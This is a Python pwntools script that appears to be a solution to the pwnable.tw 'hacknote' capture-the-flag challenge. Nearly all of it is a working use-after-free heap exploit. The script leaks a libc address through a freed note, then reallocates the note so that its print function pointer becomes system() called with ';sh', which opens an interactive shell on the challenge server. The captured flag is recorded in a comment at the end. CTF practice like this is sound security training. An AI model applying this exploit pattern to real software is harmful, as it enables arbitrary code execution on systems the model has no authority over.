from pwn import *

context(arch='i386',os='linux',log_level='debug')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

filename = "./hacknote"
ip = "chall.pwnable.tw"
port = 10102

elf = ELF(filename)

remote_libc = "./libc_32.so.6"
if LOCAL:
    # io = process(filename)
    io = process(["./x86_ld-2.23.so.2", filename] ,env={"LD_PRELOAD":"./libc_32.so.6"})
    # libc = elf.libc
    libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)
    # libc = elf.libc

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, "> \n", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))

# bps.append("*0x80488A3") 
bps.append("*0x804893D")
# bps.append("*0x80487D2") 
gds['ptr']=0x804A050

def add(io, size, con):
    io.sendlineafter("Your choice :", str(1))
    io.sendlineafter("Note size :", str(size))
    io.sendafter("Content :", con)

def remove(io, idx, ):
    io.sendlineafter("Your choice :", str(2))
    io.sendlineafter("Index :", str(idx))

def show(io, idx, ):
    io.sendlineafter("Your choice :", str(3))
    io.sendlineafter("Index :", str(idx))    


# mydebug(io)

add(io, 0x90, '/bin/sh\x00'*9)  #0
add(io, 0x20, 'a'*8 + '/bin/sh\x00')  #1

remove(io, 0)

add(io, 0x8, '0')  #2

show(io, 0)


main_arena = u32(io.recv(4))
libc.address = main_arena - 1771440 - 0x80
system = libc.sym['system']


log.info("main_arena: 0x%x", main_arena)
log.info("libc.address: 0x%x", libc.address)
log.info("system: 0x%x", system)
input()

remove(io, 0)
remove(io, 1)

add(io, 0xc, p32(system)+b';sh\x00')
show(io, 0)

io.interactive()

# FLAG{Us3_aft3r_fl3333_in_h4ck_not3}